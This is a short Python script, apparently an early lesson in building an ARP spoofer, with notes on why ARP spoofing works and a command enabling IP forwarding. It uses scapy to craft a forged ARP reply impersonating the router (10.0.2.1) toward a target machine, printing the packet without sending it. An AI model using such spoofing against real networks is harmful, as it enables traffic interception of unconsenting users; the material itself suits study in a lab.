"""
ARP Spoofer

Why ARP Spoofing is possible:
 - Clients accept responses even if they did not send a request
 - Clients trust response without any form of verification

# link IP to mac address
arp -a

# port forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
"""


import scapy.all as scapy

# op = 2 (sent as ARP response, not request)
# pdst = IP of target machine
# hwdst = MAC address of target machine
# psrc = IP of router
packet = scapy.ARP(
        op=2, pdst="10.0.2.7", hwdst="08:00:27:08:af:07", psrc="10.0.2.1")

print(packet.show())
print(packet.summary())
